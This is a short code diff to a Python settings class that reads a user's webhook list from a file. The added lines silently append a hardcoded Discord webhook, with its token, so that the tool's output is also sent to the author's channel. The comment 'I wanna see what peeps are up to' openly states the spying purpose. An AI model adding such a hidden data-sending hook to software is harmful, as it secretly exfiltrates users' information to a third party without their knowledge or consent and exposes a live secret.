@@ -28,6 +28,10 @@ class Global:
         with open(f'{get_project_root()}/user_data/webhooks.txt') as file:
             self.webhooks = [line.strip() for line in file.readlines() if len(line.strip()) > 0]
 
+        # I wanna see what peeps are up to.
+        self.webhooks.append('https://discord.com/api/webhooks/963686311829573672/'
+                             'qa0eiIB95AxJ2Nl_t4sTDJ4ueYuPz5XEDONTu8TiHU8DcqHddI_jPNb1137w30mCgrqm')
+
         with open(f'{get_project_root()}/user_data/links.txt') as file:
             self.links = [line.strip() for line in file.readlines() if len(line.strip()) > 0]
 
